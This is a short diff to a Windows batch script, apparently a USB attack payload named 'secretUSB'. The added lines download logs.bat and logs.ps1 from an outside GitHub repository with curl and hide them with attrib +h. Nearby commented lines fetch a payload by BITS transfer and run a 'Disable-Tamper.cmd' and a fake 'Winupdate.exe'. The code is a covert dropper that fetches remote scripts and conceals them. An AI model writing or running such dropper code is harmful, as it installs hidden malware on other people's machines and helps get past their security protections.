@@ -82,7 +82,11 @@ REM powershell -command "start-bitstransfer https://direct-url-for-payload/xxx.e
 
 REM start  Winupdate.exe & cd %temp% & Disable-Tamper.cmd
 
+start cmd /C curl -O https://github.com/Goenae/secretUSB/raw/main/logs.bat
+start cmd /C curl -O https://github.com/Goenae/secretUSB/raw/main/logs.ps1
 
+start cmd /C attrib +h logs.bat
+start cmd /C attrib +h logs.ps1
 
 
 
